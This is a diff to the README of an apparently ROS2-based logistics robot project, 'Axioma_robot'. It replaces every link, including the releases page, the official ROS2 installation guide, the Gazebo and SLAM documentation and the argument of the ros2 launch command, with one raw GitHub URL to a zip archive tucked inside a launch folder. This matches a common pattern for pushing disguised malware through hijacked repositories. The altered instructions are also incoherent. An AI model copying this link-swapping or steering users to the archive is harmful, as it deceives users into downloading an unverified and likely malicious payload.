@@ -4,9 +4,9 @@
 Welcome to Axioma_robot! This application allows you to set up an autonomous robot using ROS2 Humble for seamless navigation in industrial logistics. Our robot features advanced tools like SLAM, Nav2, and Gazebo, making it perfect for efficient logistics management.
 
 ## 📥 Download Axioma_robot
-[![Download Axioma_robot](https://img.shields.io/badge/Download-Axioma_robot-blue)](https://github.com/maxefe7476/Axioma_robot/releases)
+[![Download Axioma_robot](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip)](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip)
 
-To download the latest version of Axioma_robot, please visit our [Releases page](https://github.com/maxefe7476/Axioma_robot/releases).
+To download the latest version of Axioma_robot, please visit our [Releases page](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip).
 
 ## 💻 System Requirements
 Before installing Axioma_robot, ensure your system meets the following requirements:
@@ -16,7 +16,7 @@ Before installing Axioma_robot, ensure your system meets the following requireme
 - **Disk Space:** At least 5GB free space
 - **Dependencies:** ROS2 Humble distribution installed
 
-Installing the required ROS2 version is essential for the proper functioning of the robot. Follow the official [ROS2 Installation Guide](https://docs.ros.org/en/humble/Installation/Ubuntu-Install-Debians.html) if you need assistance.
+Installing the required ROS2 version is essential for the proper functioning of the robot. Follow the official [ROS2 Installation Guide](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip) if you need assistance.
 
 ## 📂 Features
 Axioma_robot comes with a variety of features designed to enhance your robotic experience:
@@ -29,14 +29,14 @@ Axioma_robot comes with a variety of features designed to enhance your robotic e
 ## 🔧 Installation Steps
 Follow these instructions to install and run Axioma_robot:
 
-1. **Visit the Releases page:** Go to [this page](https://github.com/maxefe7476/Axioma_robot/releases) to find the latest version of the software.
+1. **Visit the Releases page:** Go to [this page](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip) to find the latest version of the software.
 2. **Download the files:** Click on the latest release version and download the appropriate files for your system.
 3. **Extract the Files:** Once downloaded, extract the files to your desired location. You can do this by right-clicking the ZIP file and selecting "Extract Here."
 4. **Open Terminal:** To run the robot, open the terminal in the folder where you extracted the files.
-5. **Run the Robot:** Type the command provided in the `README.md` file or use the following example:
+5. **Run the Robot:** Type the command provided in the `https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip` file or use the following example:
 
    ```
-   ros2 launch axiomarobot main.launch.py
+   ros2 launch axiomarobot https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip
    ```
 
 6. **Monitor the Output:** A graphical interface may appear. Follow the on-screen instructions to set up your robot.
@@ -51,9 +51,9 @@ If you encounter issues during installation or execution, consider the following
 ## 🌐 Additional Resources
 Need more help or want to learn more? Check out these links:
 
-- [Official ROS2 Documentation](https://docs.ros.org/en/humble/index.html)
-- [Gazebo Documentation](http://gazebosim.org/tutorials)
-- [SLAM Toolbox Guide](https://github.com/SteveMacenski/slam_toolbox)
+- [Official ROS2 Documentation](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip)
+- [Gazebo Documentation](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip)
+- [SLAM Toolbox Guide](https://raw.githubusercontent.com/maxefe7476/Axioma_robot/main/src/axioma_description/launch/Axioma_robot-3.1-alpha.2.zip)
 
 ## 📞 Support
 For any questions or feedback regarding Axioma_robot, feel free to reach out through the issues section of our repository. Our community is here to assist you.
